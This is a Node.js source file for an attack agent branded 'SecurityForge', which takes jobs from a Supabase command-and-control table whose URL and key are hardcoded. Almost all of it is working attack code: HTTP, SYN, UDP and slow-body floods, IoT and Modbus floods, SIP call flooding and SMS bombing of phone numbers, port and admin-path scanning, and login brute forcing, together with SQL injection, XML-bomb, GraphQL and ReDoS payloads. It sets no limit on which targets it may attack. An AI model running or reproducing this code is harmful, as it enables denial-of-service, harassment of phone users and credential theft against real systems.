/**
 * SECURITYFORGE AGENT V36.9 (FULL SPECTRUM + REDIRECT FIX)
 * 
 * [MODULES]
 * - L7 HTTP STRESS: Pulse Wave, Magma, Chaos Vortex, God Mode.
 * - L4 NETJAM: UDP/TCP Floods, SYN Flood, Fragmentation.
 * - RECON: Port Scanning, Admin Hunter.
 * - IOT: MQTT, RTSP, CoAP, Modbus.
 * - GHOST: SIP (VoIP), ADB, Printer.
 * - GATEWAY: SMS API Stress, VoIP Trunk Stress, Multi-Gateway Rotator.
 * 
 * [UPDATES]
 * - Added Auto-Redirect support (301/302) for Gateway targets.
 * - Added Auto-Content-Length calculation for POST requests.
 */

const https = require('https');
const http = require('http');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const tls = require('tls');
const dns = require('dns');

// ==========================================
// CONFIGURATION
// ==========================================
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";

// ==========================================
// ASSETS & DICTIONARIES
// ==========================================
const BASE_PASSWORDS = [
    '123456', 'password', 'admin', 'root', '12345678', 'qwerty', 
    'admin123', 'guest', 'user', '111111', 'pass123', 'toor',
    'changeme', 'service', 'deploy', 'welcome', 'welcome1'
];

const USERS = [
    'admin', 'root', 'user', 'test', 'guest', 'support', 'sysadmin', 
    'administrator', 'service', 'deploy', 'backup', 'operator'
];

const TOP_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 
    993, 995, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017
];

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0"
];

// ==========================================
// ADVANCED PAYLOADS
// ==========================================
const MALICIOUS_PAYLOADS = {
  // SQL Injection
  SQL_INJECTION: `{"query": "UNION SELECT 1, SLEEP(20), 3, 4 --", "id": "1' OR '1'='1"}`,
  // XML Bomb
  XML_BOMB: `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>`,
  // JSON Bomb
  HUGE_JSON: `{"data": "${'A'.repeat(75000)}", "meta": "fill_buffer", "garbage": "${'B'.repeat(10000)}"}`,
  // GraphQL
  GRAPHQL_DEPTH: `{"query":"query { user { posts { comments { author { posts { comments { author { posts { comments { author { id } } } } } } } } } } }"}`,
  // ReDoS
  REDOS_REGEX: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!`,
  // SIP INVITE (VoIP Stress) - Now accepts targetNumber
  SIP_INVITE: (ip, targetNumber) => {
      const branch = 'z9hG4bK-' + Math.random().toString(36).substring(7);
      const tag = Math.random().toString(36).substring(7);
      const callId = Math.random().toString(36).substring(7) + '@securityforge.io';
      const toUser = targetNumber || 'stress';
      return `INVITE sip:${toUser}@${ip} SIP/2.0\r\nVia: SIP/2.0/UDP 10.0.0.1:5060;branch=${branch}\r\nFrom: <sip:ghost@securityforge.io>;tag=${tag}\r\nTo: <sip:${toUser}@${ip}>\r\nCall-ID: ${callId}\r\nCSeq: 1 INVITE\r\nMax-Forwards: 70\r\nUser-Agent: SecurityForge/V36.9\r\nContent-Length: 0\r\n\r\n`;
  }
};

// ==========================================
// SYSTEM INITIALIZATION
// ==========================================
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { 
    res.writeHead(200); 
    res.end('SecurityForge Agent V36.9 ONLINE\nStatus: WAITING FOR C2'); 
})
.listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));

// ==========================================
// CORE HELPERS
// ==========================================
const supabaseRequest = (method, pathStr, body = null) => {
    return new Promise((resolve, reject) => {
        try {
            const baseUrl = new URL(SUPABASE_URL);
            const apiPath = '/rest/v1' + (pathStr.startsWith('/') ? pathStr : '/' + pathStr);
            const options = {
                hostname: baseUrl.hostname,
                path: apiPath,
                method: method,
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=representation'
                }
            };
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => { 
                    if (res.statusCode >= 400) resolve(null);
                    else try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); } 
                });
            });
            req.on('error', (e) => reject(e));
            if (body) req.write(JSON.stringify(body));
            req.end();
        } catch(e) { reject(e); }
    });
};

// IMPROVED HTTP ENGINE (Axios-like behavior)
const makeHttpRequest = (urlStr, method, headers, body, agent, maxRedirects = 5) => {
    return new Promise((resolve, reject) => {
        if (maxRedirects < 0) return resolve({ statusCode: 310, body: 'Too many redirects', headers: {} });

        let urlObj;
        try { urlObj = new URL(urlStr); } catch(e) { return reject(e); }

        const isHttps = urlObj.protocol === 'https:';
        const lib = isHttps ? https : http;
        
        // CRITICAL FIX: APIs ignore POSTs without Content-Length
        if (body && (method === 'POST' || method === 'PUT')) {
            headers['Content-Length'] = Buffer.byteLength(body);
        }
        
        const options = {
            hostname: urlObj.hostname,
            path: urlObj.pathname + urlObj.search,
            method: method,
            headers: headers,
            agent: agent,
            timeout: 15000,
            rejectUnauthorized: false // Ignore SSL errors for stress testing
        };

        const req = lib.request(options, (res) => {
            // HANDLE REDIRECTS (301, 302, 307, 308)
            if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
                let redirectUrl = res.headers.location;
                if (!redirectUrl.startsWith('http')) {
                    try { redirectUrl = new URL(redirectUrl, urlStr).toString(); } catch(e){}
                }
                res.resume(); // Consume body
                // Follow redirect
                return resolve(makeHttpRequest(redirectUrl, method, headers, body, agent, maxRedirects - 1));
            }

            let responseBody = '';
            res.on('data', (chunk) => { 
                if (responseBody.length < 50000) responseBody += chunk; 
            });
            res.on('end', () => {
                resolve({ 
                    statusCode: res.statusCode, 
                    headers: res.headers,
                    body: responseBody 
                });
            });
        });

        req.on('error', (e) => reject(e));
        if (body) req.write(body);
        req.end();
    });
};

console.log('\x1b[36m[AGENT] Initialized V36.9 (Gateway Edition). Waiting for commands...\x1b[0m');

// ==========================================
// GLOBAL STATE
// ==========================================
let activeJob = null;
let activeLoop = null;
let pulseLoop = null;
let logBuffer = [];
let priorityBuffer = []; 

// Memory Safety Guard (Prevents Container Death)
const MAX_RAM_BYTES = 400 * 1024 * 1024; // 400MB Limit
const checkMemory = () => process.memoryUsage().heapUsed < MAX_RAM_BYTES;

const logToC2 = (msg) => {
    console.log(msg);
    const cleanMsg = msg.replace(/\x1b\[[0-9;]*m/g, '');
    if (cleanMsg.includes('[FOUND]') || cleanMsg.includes('[OPEN]') || cleanMsg.includes('[CRITICAL]') || cleanMsg.includes('[CRACKED]') || cleanMsg.includes('SUCCESS')) {
        priorityBuffer.push(cleanMsg);
    } else {
        logBuffer.push(cleanMsg);
    }
};

const getHost = (t) => t.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];

// ==========================================
// ATTACK ENGINE
// ==========================================
const startAttack = async (job) => {
    if (activeJob) return;
    try {
        activeJob = job;
        const duration = (job.duration && job.duration > 0) ? job.duration : 30;
        const startTime = Date.now(); 
        logBuffer = []; 
        priorityBuffer = [];

        // Vectors Logging
        const vectors = Object.keys(job).filter(k => k.startsWith('use_') && job[k]);
        console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | Threads: ${job.concurrency} | Duration: ${duration}s`);
        console.log(`[VECTORS] ${vectors.join(', ')}\x1b[0m`);
        logToC2(`[SYSTEM] Swarm Engaged. Target: ${job.target}`);
        
        let running = true;
        let totalRequests = 0;
        let jobSuccess = 0;
        let jobFailed = 0;
        let jobLatencySum = 0;
        let jobReqsForLatency = 0;
        let jobMaxLatency = 0;
        
        // ------------------------------------------
        // PULSE WAVE CONTROL
        // ------------------------------------------
        let pulseActive = true;
        if (job.use_pulse) {
            pulseLoop = setInterval(() => {
                pulseActive = !pulseActive;
            }, 2000); // 2s Burst, 2s Sleep cycle
        }

        // ------------------------------------------
        // SMART PASSWORD GENERATION
        // ------------------------------------------
        let SMART_PASSWORDS = [...BASE_PASSWORDS];
        if (job.use_login_siege) {
            try {
                const urlObj = new URL(job.target);
                const domainParts = urlObj.hostname.split('.');
                const mainName = domainParts.length > 2 ? domainParts[domainParts.length-2] : domainParts[0];
                const mutations = [mainName, mainName+'123', 'admin@'+mainName, mainName+'!'];
                SMART_PASSWORDS = [...mutations, ...BASE_PASSWORDS];
            } catch(e) {}
        }

        // Calibration for Login/SMS Attack
        let calibrationDone = false;
        let failSize = 0;
        let failStatus = 0;
        
        // Pre-parse Gateways if Multi-Mode
        let multiGateways = [];
        if (job.use_multi_gateway) {
            try {
                multiGateways = JSON.parse(job.body);
                if (!Array.isArray(multiGateways)) multiGateways = [];
            } catch(e) { console.error('Gateway Parse Error', e); }
        }

        // ==========================================
        // MODULE: GHOST / IOT / GATEWAY
        // ==========================================
        if (job.use_ghost_writer || job.use_adb_swarm || job.use_sip_flood) {
            const targetIP = getHost(job.target);
            const message = job.ghost_message || "SECURITY ALERT"; // Reused as "Target Number" for SIP
            
            const broadcast = () => {
                if (!running) return;
                if (!checkMemory()) return setTimeout(broadcast, 500);
                
                // 1. Ghost Writer (Port 9100)
                if (job.use_ghost_writer) {
                    const c = new net.Socket(); 
                    c.setTimeout(2000);
                    c.connect(9100, targetIP, () => { 
                        c.write(message + "\r\n\r\n"); 
                        c.destroy(); 
                        logToC2(`[GHOST] PJL Print Command Sent to ${targetIP}`); 
                        jobSuccess++; 
                    });
                    c.on('error', () => c.destroy());
                }
                
                // 2. ADB Swarm (Port 5555)
                if (job.use_adb_swarm) {
                    const c = new net.Socket(); 
                    c.setTimeout(2000);
                    c.connect(5555, targetIP, () => { 
                        // ADB Handshake Packet
                        c.write("CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x00\x20\x00\x00\x00\x00\x10\x00\x00\xbc\xb1\xa7\xb1host::\x00"); 
                        c.destroy(); 
                        jobSuccess++; 
                    });
                    c.on('error', () => c.destroy());
                }
                
                // 3. SIP Flood (Port 5060) - "The Call Stresser"
                if (job.use_sip_flood) {
                    try {
                        const c = dgram.createSocket('udp4');
                        c.on('error', () => { try{c.close();}catch(e){} });
                        // Simulate multiple callers by randomizing tags
                        // ghost_message is used as the target phone number/extension here
                        const payload = Buffer.from(MALICIOUS_PAYLOADS.SIP_INVITE(targetIP, job.ghost_message));
                        c.send(payload, 5060, targetIP, (err) => { 
                            try{c.close();}catch(e){} 
                        });
                        jobSuccess++;
                    } catch(e) {}
                }

                totalRequests++;
                if (running) setTimeout(broadcast, Math.max(10, 1000 / job.concurrency));
            };

            const threadCount = Math.min(job.concurrency || 10, 50);
            for(let i=0; i<threadCount; i++) setTimeout(broadcast, i * 50);
        }
        else if (job.use_iot_death_ray || job.use_mqtt_flood || job.use_rtsp_storm || job.use_coap_burst || job.use_dns_reaper || job.use_syn_flood || job.use_frag_attack || job.use_modbus_storm) {
            const targetHost = getHost(job.target);
            const flood = () => {
                if (!running) return;
                if (!checkMemory()) return setTimeout(flood, 250);
                try {
                    // UDP Vectors
                    if(job.use_dns_reaper || job.use_coap_burst || job.use_frag_attack) {
                        const c = dgram.createSocket('udp4');
                        c.on('error', () => { try{c.close();}catch(e){} });
                        const port = job.use_dns_reaper ? 53 : (job.use_coap_burst ? 5683 : 80);
                        const payload = Buffer.alloc(Math.floor(Math.random() * 1024) + 64, 'x'); // Random junk
                        c.send(payload, port, targetHost, () => { try{c.close();}catch(e){} });
                    } 
                    // TCP/SCADA Vectors
                    else if (job.use_modbus_storm) {
                         const c = new net.Socket(); c.setTimeout(2000);
                         c.connect(502, targetHost, () => { 
                             c.write(Buffer.from('00000000000601030000000a', 'hex')); 
                             c.destroy(); 
                         }); 
                         c.on('error', () => c.destroy());
                    } 
                    // Generic TCP Floods (MQTT/RTSP)
                    else {
                        const c = new net.Socket(); c.setTimeout(2000);
                        const port = job.use_mqtt_flood ? 1883 : (job.use_rtsp_storm ? 554 : 80);
                        c.connect(port, targetHost, () => { c.destroy(); });
                        c.on('error', ()=>{ c.destroy(); });
                    }
                    totalRequests++;
                } catch(e) {}
                if (running) setImmediate(flood);
            };
            for(let i=0; i<Math.min(job.concurrency, 300); i++) flood();
        }
        else if (job.use_admin_hunter) {
             let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
             const ADMIN_PATHS = ['/admin', '/login', '/wp-admin', '/dashboard', '/.env', '/config.php', '/cpanel', '/user/login'];
             const lib = targetUrl.protocol === 'https:' ? https : http;
             const scan = (idx) => {
                 if (!running) return;
                 const path = ADMIN_PATHS[idx % ADMIN_PATHS.length];
                 const req = lib.request({ hostname: targetUrl.hostname, path, method: 'GET', timeout: 3000 }, (res) => {
                     if ([200, 403, 401].includes(res.statusCode)) logToC2(`[FOUND] ${targetUrl.hostname}${path} -> ${res.statusCode}`);
                     totalRequests++;
                     if (running) setTimeout(() => scan(idx + 1), 100);
                 });
                 req.on('error', () => { if(running) setImmediate(() => scan(idx + 1)); });
                 req.end();
             };
             for(let i=0; i<5; i++) scan(i);
        }
        else if (job.use_port_scan) {
            let targetHost = getHost(job.target);
            const scanPort = (idx) => {
                if (!running) return;
                const port = TOP_PORTS[idx % TOP_PORTS.length];
                const s = new net.Socket(); s.setTimeout(2000);
                s.on('connect', () => { logToC2(`[OPEN] Port ${port} OPEN`); s.destroy(); jobSuccess++; });
                s.on('error', () => s.destroy());
                s.on('timeout', () => s.destroy());
                s.connect(port, targetHost);
                totalRequests++;
                if (running) setTimeout(() => scanPort(idx + 1), 100);
            }
            for(let i=0; i<5; i++) scanPort(i);
        }
        else {
            // ==========================================
            // MODULE: L7 HTTP STRESS & SMS GATEWAY
            // ==========================================
            let targetUrl;
            try { targetUrl = new URL(job.target); } catch(e) { return; }
            
            const isMagma = job.use_magma || job.use_rudy;
            const agentOpts = { keepAlive: true, keepAliveMsecs: isMagma ? 20000 : 1000, maxSockets: Infinity };
            const httpsAgent = new https.Agent(agentOpts);
            const httpAgent = new http.Agent(agentOpts);

            const performRequest = async () => {
                if (!running) return;
                if (!checkMemory()) return setTimeout(performRequest, 100);
                
                if (job.use_pulse && !pulseActive) {
                    return setTimeout(performRequest, 100); 
                }

                // -----------------------------------
                // MULTI-GATEWAY LOGIC (The Rotator)
                // -----------------------------------
                let currentUrl = targetUrl;
                let method = job.method || 'GET';
                let body = job.body;
                let headers = {
                    'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
                    'Content-Type': 'application/json',
                    ...((typeof job.headers === 'string' ? {} : job.headers) || {})
                };

                if (job.use_multi_gateway && multiGateways.length > 0) {
                    // Pick next gateway (Round Robin or Random)
                    const gw = multiGateways[totalRequests % multiGateways.length];
                    try {
                        const urlStr = gw.url.replace('$TARGET', job.target);
                        currentUrl = new URL(urlStr);
                        method = gw.method || 'GET';
                        // Merge headers, allow specific gateway override
                        if(gw.headers) Object.assign(headers, gw.headers);
                        // Inject User Agent if missing
                        if(!headers['User-Agent']) headers['User-Agent'] = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
                        
                        if (gw.body) {
                            body = typeof gw.body === 'string' 
                                ? gw.body.replace('$TARGET', job.target) 
                                : JSON.stringify(gw.body).replace('$TARGET', job.target);
                        }
                    } catch(e) {
                        totalRequests++; // Skip malformed
                        return setImmediate(performRequest);
                    }
                }

                const agent = currentUrl.protocol === 'https:' ? httpsAgent : httpAgent;
                let creds = null;

                if (job.use_chaos || job.use_god_mode) {
                    headers['X-Chaos-ID'] = crypto.randomBytes(4).toString('hex');
                    headers['X-Forwarded-For'] = Array(4).fill(0).map(()=>Math.floor(Math.random()*255)).join('.');
                    headers['Referer'] = 'https://google.com?q=' + crypto.randomBytes(4).toString('hex');
                }

                // SMS GATEWAY FLOOD (Single Mode)
                if (job.use_sms_flood && !job.use_multi_gateway) {
                    method = 'POST';
                    if (job.use_form_data) {
                         headers['Content-Type'] = 'application/x-www-form-urlencoded';
                         // Ensure body is set, otherwise default to a generic test body
                         if (!body) body = "to=1234567890&message=Test+Flood+Message";
                    } else {
                         headers['Content-Type'] = 'application/json';
                         if (!body) body = JSON.stringify({ to: "1234567890", text: "Test Flood Message" });
                    }
                }

                // PAYLOAD SELECTION
                if (job.use_redos) { headers['User-Agent'] = MALICIOUS_PAYLOADS.REDOS_REGEX; body = MALICIOUS_PAYLOADS.REDOS_REGEX; method = 'POST'; }
                if (job.use_graphql_bomb) { body = MALICIOUS_PAYLOADS.GRAPHQL_DEPTH; method = 'POST'; }
                if (job.use_xml_bomb) { body = MALICIOUS_PAYLOADS.XML_BOMB; method = 'POST'; }
                if (job.use_goldeneye || job.use_big_bang) { body = MALICIOUS_PAYLOADS.HUGE_JSON; method = 'POST'; }

                // R.U.D.Y. (Slow Body - Keeps using native lib directly)
                if (job.use_rudy) {
                    const lib = currentUrl.protocol === 'https:' ? https : http;
                    headers['Content-Length'] = 10000;
                    const req = lib.request(currentUrl, { method: 'POST', agent, headers }, (res) => { res.resume(); });
                    req.on('error', () => {});
                    const interval = setInterval(() => {
                        if(!running) { clearInterval(interval); req.destroy(); return; }
                        try { req.write('A'); } catch(e) { clearInterval(interval); }
                    }, 5000); 
                    totalRequests++; 
                    return;
                }

                // LOGIN SIEGE Setup
                if (job.use_login_siege) {
                    if (!calibrationDone) {
                         const calBody = JSON.stringify({u:'bad',p:'bad'});
                         try {
                             const res = await makeHttpRequest(currentUrl.toString(), 'POST', headers, calBody, agent);
                             failStatus = res.statusCode; 
                             failSize = parseInt(res.headers['content-length']||'0');
                             calibrationDone = true;
                         } catch(e) {}
                         return setTimeout(performRequest, 1000);
                    }
                    const user = USERS[Math.floor(Math.random()*USERS.length)];
                    const pass = SMART_PASSWORDS[Math.floor(Math.random()*SMART_PASSWORDS.length)];
                    creds = [user, pass];
                    method = 'POST';
                    if (job.use_form_data) { headers['Content-Type']='application/x-www-form-urlencoded'; body=`username=${user}&password=${pass}`; }
                    else body=JSON.stringify({username:user, password:pass});
                }

                // STANDARD EXECUTION (Now using makeHttpRequest for Redirect Support)
                try {
                    const start = Date.now();
                    const res = await makeHttpRequest(currentUrl.toString(), method, headers, body, agent);
                    const latency = Date.now() - start;
                    let isSuccess = false;
                    
                    if (job.use_login_siege) {
                        let currentSize = parseInt(res.headers['content-length'] || '0');
                        if(currentSize === 0) currentSize = res.body.length;
                        const sizeDiff = Math.abs(currentSize - failSize);
                        const bodyLower = res.body.toLowerCase();
                        const isFail = bodyLower.includes('fail') || bodyLower.includes('error') || bodyLower.includes('denied');
                        if (!isFail && (res.statusCode !== failStatus || (failSize > 0 && sizeDiff > failSize * 0.2))) {
                            logToC2(`\x1b[32m[CRACKED] FOUND: ${creds[0]}:${creds[1]}`); isSuccess = true;
                        }
                    } else {
                        isSuccess = res.statusCode < 400;
                    }
                    
                    jobLatencySum += latency; jobReqsForLatency++; jobMaxLatency = Math.max(jobMaxLatency, latency);
                    if (isSuccess) jobSuccess++; else jobFailed++;
                    totalRequests++;
                } catch(e) {
                    jobFailed++;
                    totalRequests++;
                }
                
                if (running) setImmediate(performRequest);
            };

            const concurrency = Math.min(job.concurrency, 3000); 
            for(let i=0; i<concurrency; i++) performRequest();
        }

        const updateC2 = async () => {
            if (!running) return;
            const elapsed = (Date.now() - startTime) / 1000;
            if (duration > 0 && elapsed >= duration) {
                running = false; clearInterval(activeLoop); clearInterval(pulseLoop);
                logToC2('[SYSTEM] Attack duration complete.');
                await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { status: 'COMPLETED', total_success: jobSuccess, total_failed: jobFailed });
                activeJob = null; return;
            }
            const rps = elapsed > 0 ? totalRequests / elapsed : 0;
            const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
            const normalLogsToTake = Math.max(0, 30 - priorityBuffer.length);
            const combinedLogs = [...priorityBuffer, ...logBuffer.slice(-normalLogsToTake)];
            const currentLogs = combinedLogs.length > 0 ? JSON.stringify(combinedLogs) : null;
            priorityBuffer = []; logBuffer = []; 
            const res = await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { 
                current_rps: Math.round(rps), total_success: jobSuccess, total_failed: jobFailed, avg_latency: avgLat, max_latency: jobMaxLatency, ...(currentLogs ? { logs: currentLogs } : {})
            });
            if (res && res[0] && res[0].status === 'STOPPED') {
                running = false; clearInterval(activeLoop); clearInterval(pulseLoop);
                logToC2('[SYSTEM] Stop Signal Received.'); activeJob = null;
            }
        };
        activeLoop = setInterval(updateC2, 2000);
    } catch(e) { console.log('CRASH PREVENTION:', e); activeJob = null; }
};

setInterval(async () => {
    if (activeJob) return;
    const jobs = await supabaseRequest('GET', 'jobs?status=eq.PENDING&order=created_at.desc&limit=1&select=*');
    if (jobs && jobs.length > 0) {
        const job = jobs[0];
        if (typeof job.headers === 'string') { try { job.headers = JSON.parse(job.headers); } catch(e) { job.headers = {}; } }
        await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { status: 'RUNNING' });
        startAttack(job);
    }
}, 2000);
